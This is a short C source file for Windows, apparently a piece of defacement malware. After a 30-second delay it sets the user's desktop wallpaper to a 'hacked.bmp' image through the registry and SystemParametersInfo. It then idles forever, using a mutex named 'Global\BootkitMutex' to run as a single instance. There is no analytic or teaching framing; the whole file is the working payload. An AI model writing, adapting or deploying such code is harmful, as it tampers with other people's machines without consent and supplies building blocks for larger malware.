#include <windows.h>

BOOL ChangeWallpaperToHacked() {
    char szWallpaperPath[MAX_PATH];
    GetWindowsDirectoryA(szWallpaperPath, MAX_PATH);
    strcat(szWallpaperPath, "\\hacked.bmp");
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Control Panel\\Desktop", 
                      0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "Wallpaper", 0, REG_SZ, 
                       (BYTE*)szWallpaperPath, strlen(szWallpaperPath) + 1);
        RegCloseKey(hKey);
    }
    
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, 
                         (PVOID)szWallpaperPath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    return TRUE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\BootkitMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
    
    Sleep(30000);
    ChangeWallpaperToHacked();
    
    while (1) Sleep(60000);
    return 0;
}
